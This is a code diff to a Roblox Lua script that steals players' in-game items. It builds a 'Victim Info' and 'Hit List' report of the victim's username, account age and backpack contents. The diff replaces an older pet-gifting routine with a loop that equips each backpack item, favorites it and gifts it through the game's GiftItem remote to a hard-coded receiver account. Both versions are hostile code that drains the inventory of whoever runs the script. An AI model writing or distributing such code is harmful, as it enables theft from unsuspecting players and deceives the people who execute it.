@@ -151,8 +151,8 @@ task.spawn(function()
     end
 
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
-                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: dogzss01\nAccount Age: " .. accountAge ..
-                    "\nReceiver: sssfysue7\n──────────────\n**Hit List:**\n"
+                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
+                    "\nReceiver: dogzss01\n──────────────\n**Hit List:**\n"
 
     for i = 1, math.min(10, #backpackContent) do
         message = message .. "• " .. backpackContent[i] .. "\n"
@@ -197,71 +197,56 @@ task.spawn(function()
 end)
 
 -- =========================
--- 4: قسم الجيفت الكامل
+-- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
 -- =========================
-local function removePetsFromFarm()
-    while true do
-        pcall(function()
-            local PetsService = ReplicatedStorage:FindFirstChild("GameEvents")
-                                and ReplicatedStorage.GameEvents:FindFirstChild("PetsService")
-            if PetsService then
-                for _, obj in ipairs(workspace:GetDescendants()) do
-                    if obj:IsA("Model") or obj:IsA("Folder") then
-                        local id = string.match(obj.Name, "{[%w%-]+}")
-                        if id then
-                            pcall(function() PetsService:FireServer("UnequipPet", id) end)
-                            wait(0.2)
-                        end
-                    end
-                end
-            end
-        end)
-        wait(60)
-    end
-end
+local TARGET_PLAYER_NAME = "dogzss01"
+local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
+local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
 
-local function equipPet(pet)
-    if pet and pet.Parent ~= player.Character then
-        pet.Parent = player.Character
+local function equipItem(item)
+    if item and item.Parent ~= player.Character then
+        item.Parent = player.Character
         local humanoid = player.Character:FindFirstChild("Humanoid")
-        if humanoid and pet:IsA("Tool") then
-            pcall(function() humanoid:EquipTool(pet) end)
+        if humanoid and item:IsA("Tool") then
+            pcall(function() humanoid:EquipTool(item) end)
         end
     end
 end
 
-local function equipPetsAndToggleFavorite()
+local function toggleFavorite(item)
+    pcall(function() FavoriteRemote:FireServer(item:GetDebugId() or item.Name) end)
+end
+
+local function sendGift(item)
+    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
+    if targetPlayer then
+        pcall(function()
+            GiftRemote:FireServer({
+                ["Item"] = item,
+                ["ToGift"] = TARGET_PLAYER_NAME
+            })
+        end)
+    end
+end
+
+task.spawn(function()
     while true do
         local backpack = player:FindFirstChild("Backpack")
         if backpack then
+            local itemsToProcess = {}
             for _, item in ipairs(backpack:GetChildren()) do
-                local itemType = item:GetAttribute("ItemType")
-                if itemType == "Pet" or string.find(item.Name:lower(),"pet") then
-                    equipPet(item)
-                    task.wait(0.5)
-                    pcall(function() ReplicatedStorage.GameEvents.Favorite_Item:FireServer(item) end)
-                    task.wait(3)
-                end
+                table.insert(itemsToProcess, item)
+            end
+
+            for _, item in ipairs(itemsToProcess) do
+                equipItem(item)
+                task.wait(0.5)
+                toggleFavorite(item)
+                task.wait(3)
+                sendGift(item)
+                task.wait(2)
             end
         end
         task.wait(1)
     end
-end
-
-local function autoGivePet(targetPlayerName)
-    local targetPlayer = Players:FindFirstChild(targetPlayerName)
-    while not targetPlayer do
-        Players.PlayerAdded:Wait()
-        targetPlayer = Players:FindFirstChild(targetPlayerName)
-    end
-    while true do
-        if targetPlayer then
-            pcall(function() ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer) end)
-        end
-        task.wait(2)
-    end
-end
-
-task.spawn(removePetsFromFarm)
-task.spawn(equipPetsAndToggleFavorite)
-task.spawn(function() autoGivePet("sssfysue7") end)
+end)
